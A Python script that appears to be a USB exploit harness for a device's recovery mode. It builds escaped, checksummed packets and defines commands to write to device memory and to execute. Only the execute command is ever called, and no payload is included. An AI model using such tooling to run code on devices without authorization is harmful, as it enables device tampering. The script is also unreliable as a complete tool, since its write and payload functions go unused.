import usb.core
import usb.util
import struct
import random
import sys
import time
import argparse
import os
import tempfile
import subprocess
from tqdm import tqdm


def mask_payload(buf):
    output = []
    for ch in buf:
        if ch in [0xF0, 0xFF, 0xFE]:
            output.append(0xF0)
            output.append(ch ^ 0x10)
        else:
            output.append(ch)
    output += [0xF0, 0xF0]
    return bytes(output)


def mask_packet(pkt):
    out = [0xFF]
    ck = 0
    for b in pkt:
        if b in [0xFD, 0xFE, 0xFF]:
            out.append(0xFD)
            out.append(b ^ 0x10)
        else:
            out.append(b)
        ck += b
    ck = (-ck) & 0xFF
    if ck in [0xFD, 0xFE, 0xFF]:
        out.append(0xFD)
        out.append(ck ^ 0x10)
    else:
        out.append(ck)
    out.append(0xFE)

    return bytearray(out)


def make_packet(cmd, subcmd, variable_payload=None):
    if variable_payload is None:
        variable_payload = b""
    packet = struct.pack("<BBBHBBBB", 0xE9, 0xE3, 0x42, 6 + len(variable_payload), 0, 0, cmd, subcmd) + variable_payload
    return mask_packet(packet)


def unmask_resp(resp):
    assert resp[0] == 0xFF
    assert resp[-1] == 0xFE
    resp = resp[1:-1]
    out = []
    x = 0
    while x < len(resp):
        if resp[x] == 0xFD:
            out.append(resp[x+1] ^ 0x10)
            x += 2
        else:
            out.append(resp[x])
            x += 1
    return bytearray(out)


def checksum2(data):
    s = 0
    for x in range(0, len(data), 2):
        s += struct.unpack("<H", data[x:x+2])[0]
    return struct.pack("<H", (-s) & 0xFFFF)


class Exploit:

    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('--vid', type=lambda x: int(x, 16), required=True)
        parser.add_argument('--pid', type=lambda x: int(x, 16), required=True)

        self.args = parser.parse_args()

    def comm_oneway(self, cmd, subcmd=0, variable_payload=None):
        pkt = make_packet(cmd, subcmd, variable_payload)
        ret = self.dev.write(0x8, pkt)

    def comm(self, cmd, subcmd=0, variable_payload=None):
        self.comm_oneway(cmd, subcmd, variable_payload)
        resp = b""
        while True:
            resp += self.dev.read(0x87, 64)
            if resp.endswith(b"\xFE"):
                break
        return unmask_resp(resp)

    def cmd_write(self, addr, data):
        self.comm_oneway(4, variable_payload=struct.pack("<IH", addr, len(data)) + data)

    def cmd_exec(self):
        self.comm(3, variable_payload=b"\x01")

    def run(self):
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)
        if self.dev is None:
            raise RuntimeError("cannot find device with VID={:04X} PID={:04X}".format(self.args.vid, self.args.pid))

        # go into serial comms mode => turns green led on for some, display on
        print("Enter recovery mode")
        self.dev.ctrl_transfer(0x41, 0x60, 0x60, 2)
        self.dev.read(0x86, 64)

        # some devices e.g. n-02c need delay/reinit before it can be used
        print("Wait 3s...")
        time.sleep(3)
        self.dev = usb.core.find(idVendor=self.args.vid, idProduct=self.args.pid)

        print("Execute payload")
        self.cmd_exec()


def main():
    e = Exploit()
    e.run()


if __name__ == "__main__":
    main()
